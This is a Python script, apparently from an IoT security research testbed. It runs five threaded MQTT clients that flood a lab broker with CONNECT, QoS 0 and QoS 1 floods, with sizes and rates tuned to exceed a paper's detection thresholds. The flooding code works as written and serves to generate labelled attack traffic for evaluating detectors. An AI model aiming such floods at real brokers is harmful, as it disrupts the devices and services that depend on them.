# attacker_publisher.py
# Runs on RPi 4 #2.
# Simulates 5 attacker clients (IDs 10-14).
# Each attacker uses one of the 3 attack types from the paper (Section 4.2).
#
# Every client runs in its own thread with its own MQTT connection and its
# own send loop, so the time delta the broker measures for a client is that
# client's real sending interval (Sec. 7: "each running as a separate client
# process"). Previously all five IDs were sent round-robin from one loop, so
# each ID reached the broker only once per full cycle (~40 ms). That hid the
# QoS 0 fast-flooding client (12) behind the 30 ms θ2avg threshold.
#
# Usage:
#   pip3 install paho-mqtt --break-system-packages
#   python3 attacker_publisher.py --broker 192.168.1.100
#
# Attack types:
#   1. Basic CONNECT flooding  — large payload + high rate
#   2. Fast flooding (QoS 0)   — high rate, low time delta
#   3. Heavy flooding (QoS 1)  — large payload + high rate

import paho.mqtt.client as mqtt
import time
import random
import json
import argparse
import socket
import threading

# Configuration
ATTACK_CLIENT_IDS = list(range(10, 15))   # clients 10-14 are attackers

# Attack parameters — all designed to violate paper thresholds
# θ1max=650B, θ2min=5ms

# Attack 1: Basic CONNECT flooding
# L > θ1max, tδ < θ2min
CONNECT_FLOOD_PAYLOAD = (660, 900)   # bytes — above θ1max (650B)
CONNECT_FLOOD_SLEEP   = (1, 3)       # ms — below θ2min (5ms)

# Attack 2: Fast flooding (QoS 0)
# tδ < θ2avg (30ms) — small payload but very fast
FAST_FLOOD_PAYLOAD    = (4, 8)       # bytes — small payload
FAST_FLOOD_SLEEP      = (1, 4)       # ms — well below θ2avg (30ms)

# Attack 3: Heavy flooding (QoS 1)
# L > θ1max, tδ < θ2min
HEAVY_FLOOD_PAYLOAD   = (660, 1000)  # bytes — above θ1max
HEAVY_FLOOD_SLEEP     = (2, 4)       # ms — below θ2min

# Each attacker client uses a fixed attack type
ATTACK_TYPE_MAP = {
    10: 'connect',   # connect flooding
    11: 'connect',
    12: 'qos0',      # fast flooding
    13: 'qos1',      # heavy flooding
    14: 'qos1'
}

BASE_SEED = 2


def create_mqtt_client(client_id):
    """
    Use callback API v2 when available to avoid deprecation warnings,
    while staying compatible with older paho-mqtt releases.
    """
    try:
        return mqtt.Client(
            client_id=client_id,
            callback_api_version=mqtt.CallbackAPIVersion.VERSION2
        )
    except (AttributeError, TypeError):
        return mqtt.Client(client_id=client_id)


def make_payload(cid, target_bytes, is_attack=1):
    """
    Build a JSON payload whose total encoded length is ~target_bytes.
    """
    base    = json.dumps({"cid": cid, "is_attack": is_attack, "data": ""})
    padding = max(0, target_bytes - len(base.encode()))
    return json.dumps({
        "cid":       cid,
        "is_attack": is_attack,
        "data":      "X" * padding
    }).encode()


def next_message(attack_type, rng):
    """Return (payload_len, sleep_seconds) for one message of this attack type."""
    if attack_type == 'connect':
        # Attack 1: CONNECT flooding
        plen       = rng.randint(*CONNECT_FLOOD_PAYLOAD)
        base_sleep = rng.randint(*CONNECT_FLOOD_SLEEP)
        sleep      = (base_sleep + abs(rng.gauss(2, 8))) / 1000.0
    elif attack_type == 'qos0':
        # Attack 2: Fast flooding
        plen       = rng.randint(*FAST_FLOOD_PAYLOAD)
        base_sleep = rng.randint(*FAST_FLOOD_SLEEP)
        sleep      = (base_sleep + abs(rng.gauss(2, 5))) / 1000.0
    else:
        # Attack 3: Heavy flooding (qos1)
        plen       = rng.randint(*HEAVY_FLOOD_PAYLOAD)
        base_sleep = rng.randint(*HEAVY_FLOOD_SLEEP)
        sleep      = (base_sleep + abs(rng.gauss(2, 8))) / 1000.0
    return plen, sleep


class AttackerClient(threading.Thread):
    """One attacker client: its own MQTT connection and its own send loop."""

    def __init__(self, cid, broker_ip, broker_port, stop_event, verbose):
        super().__init__(daemon=True, name=f"attacker_c{cid}")
        self.cid         = cid
        self.attack_type = ATTACK_TYPE_MAP[cid]
        self.broker_ip   = broker_ip
        self.broker_port = broker_port
        self.stop_event  = stop_event
        self.verbose     = verbose
        self.rng         = random.Random(BASE_SEED * 100 + cid)
        self.client      = create_mqtt_client(f"attacker_c{cid}_rpi4_2")

    def run(self):
        try:
            self.client.connect(self.broker_ip, self.broker_port, keepalive=60)
        except ConnectionRefusedError:
            print(f"[Attacker] c{self.cid} connection refused by "
                  f"{self.broker_ip}:{self.broker_port}")
            return
        except socket.gaierror as e:
            print(f"[Attacker] c{self.cid} invalid broker address "
                  f"'{self.broker_ip}': {e}")
            return
        except OSError as e:
            print(f"[Attacker] c{self.cid} could not connect to "
                  f"{self.broker_ip}:{self.broker_port} ({e})")
            return

        self.client.loop_start()
        msg_t = self.attack_type
        topic = f"mqttsec/c{self.cid}/{msg_t}"
        qos   = 0 if msg_t == 'qos0' else 1
        # Single write (text + newline) so lines from different threads don't merge
        print(f"[Attacker] c{self.cid:2d} connected | attack={msg_t}\n", end="")

        try:
            while not self.stop_event.is_set():
                plen, sleep = next_message(msg_t, self.rng)
                payload = make_payload(self.cid, plen, is_attack=1)
                try:
                    result = self.client.publish(topic, payload, qos=qos)
                    if result.rc != mqtt.MQTT_ERR_SUCCESS:
                        print(f"[Attacker] c{self.cid} publish failed: {result.rc}")
                    elif self.verbose:
                        print(f"[Attacker] c{self.cid:2d} | {msg_t:8s} | "
                              f"{len(payload):5d}B | sleep={sleep*1000:.0f}ms")
                except Exception as e:
                    print(f"[Attacker] c{self.cid} error: {e}")

                self.stop_event.wait(sleep)
        finally:
            self.client.loop_stop()
            self.client.disconnect()


def run_attacker_publisher(broker_ip, broker_port=1883, verbose=False):
    stop_event = threading.Event()
    clients = [AttackerClient(cid, broker_ip, broker_port, stop_event, verbose)
               for cid in ATTACK_CLIENT_IDS]

    print(f"[Attacker] Starting attack clients {ATTACK_CLIENT_IDS} "
          f"(one connection and send loop per client)")
    print(f"[Attacker] Attack types: {ATTACK_TYPE_MAP}")
    for c in clients:
        c.start()

    try:
        while any(c.is_alive() for c in clients):
            time.sleep(0.5)
    except KeyboardInterrupt:
        print("\n[Attacker] Stopping...")
    finally:
        stop_event.set()
        for c in clients:
            c.join(timeout=2.0)
        print("[Attacker] Stopped.")


if __name__ == '__main__':
    parser = argparse.ArgumentParser(description="Attacker MQTT Publisher")
    parser.add_argument('--broker', default='192.168.1.100',
                        help='Broker IP (RPi 5). Default: 192.168.1.100')
    parser.add_argument('--port',   default=1883, type=int,
                        help='Broker port. Default: 1883')
    parser.add_argument('--verbose', action='store_true',
                        help='Print every published message')
    args = parser.parse_args()

    run_attacker_publisher(args.broker, args.port, args.verbose)
